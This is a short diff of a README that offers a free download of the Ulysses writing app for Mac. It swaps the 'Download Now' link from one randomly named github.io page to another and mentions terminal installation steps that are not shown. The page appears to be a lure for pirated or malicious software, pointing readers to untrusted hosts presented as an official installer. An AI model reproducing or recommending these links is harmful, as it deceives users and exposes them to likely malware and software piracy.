@@ -1,7 +1,7 @@
 # Ulysses For Mac — Free Download
 Ulysses is a powerful writing app for Mac, designed for writers, journalists, and creatives. Follow the instructions below to download and install Ulysses for free on your Mac OS. 🚀
 
-[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://fituganshfgh.github.io/.github/ulysses)
+[![Download Now](https://img.shields.io/badge/Download-Now-007AFF?style=for-the-badge)](https://mrboomzeus519.github.io/gimronus/ulysses)
 
 If the button above doesn’t work, follow the manual installation instructions below using the terminal.
 
